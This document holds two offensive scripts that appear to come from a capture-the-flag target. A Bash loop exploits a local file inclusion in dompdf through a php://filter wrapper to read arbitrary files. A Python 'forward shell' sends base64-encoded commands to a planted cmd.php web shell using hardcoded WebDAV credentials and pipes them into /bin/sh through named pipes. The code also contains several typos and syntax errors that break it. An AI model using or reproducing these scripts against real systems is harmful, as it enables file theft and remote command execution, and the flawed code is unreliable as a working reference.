
lfi.sh
````bash
#!/bin/bash

#Colours
greenColour="\e[0;32m\033[1m"
endColour="\033[0m\e[0m"
redColour="\e[0;31m\033[1m"
blueColour="\e[0;34m\033[1m"
yellowColour="\e[0;33m\033[1m"
purpleColour="\e[0;35m\033[1m"
turquoiseColour="\e[0;36m\033[1m"
grayColour="\e[0;37m\033[1m"

function ctrl_c(){
  echo -e "\n\n${redColour}[!] Saliendo...${endColour}\n"
  exit 1
}

# Ctrl+C
trap ctrl_c INT

while true; do
  echo -ne "${yellowColour}[${endColour}${blueColour}~${endColour}${yellowColour}]${endColour}${redColour} >${endColour} " && read -r command
  echo
  curl -s -X GET "http://10.10.10.67/dompdf/dompdf.php?input_file=php://filter/read=covert.base64-encode-/resource=$command" | grep -oP '\(.*?\)' | tail -n 1 tr -d '()' | base64 -d
  echo
done
````

and forwardShell.py

````python
#!/usr/bin/python3

import requests
import sys
import pdb
import signal
from random import randrange
from base64 import b64encode

def def_handler(sig, frame):
    print ("\n\n[!] Saliendo...\n")
    sys.exit(1)

#Ctrl+C
signal.signal(signal.SIGINT, def_handler)

#variables globales
main_url = "http://webdav_tester:babygurl69@10.10.xx.xx/webdav_test_inception/cmd.php"
global stdin, stdout
session = randrange(1, 9999)
stdin = "/dev/shm/stdin.%s" % session
stdout = "/dev/shm/stdout.%s" % session

def RunCmd(command):

    command = b64encode(command.encode()).decode()

    post_data = {
        'cmd': 'echo "%s" | base64 -d | bash' % commad
    }

    r = requests.post(main_url, data=post_data, timeout=2)

    return r.text

def WriteCmd(command):

    command = b64encode(command.encode()).decode()

    post_data = {
        'cmd': 'echo "%s" | base64 -d > %s' % command, stdin)
    }

    r = requests.post(main_url, data=post_data, timeout=2)

    return r.text

def ReadCmd():

    ReadTheOutput = """/bin/cat %s""" % stdout

    response = RunCmd(ReadTheOutput):

    return response

def SetupShell():

    NamedPipes = """mkfifo %s; tail -f %s | /bin/sh 2>&1 > %s""" % (stdin, stdin, stdout)

    try:
        RunCmd(NamedPipes)
    except:
        None

    return None

if __name__ == '__main__':

    while True:
        command = input("> " )
        WhileCmd(command + "\n")
        response = ReadCmd()

        print(response)

        ClearTheOutput = """echo '' > %s""" % stdout

        RunCmd(ClearTheOutput)

````
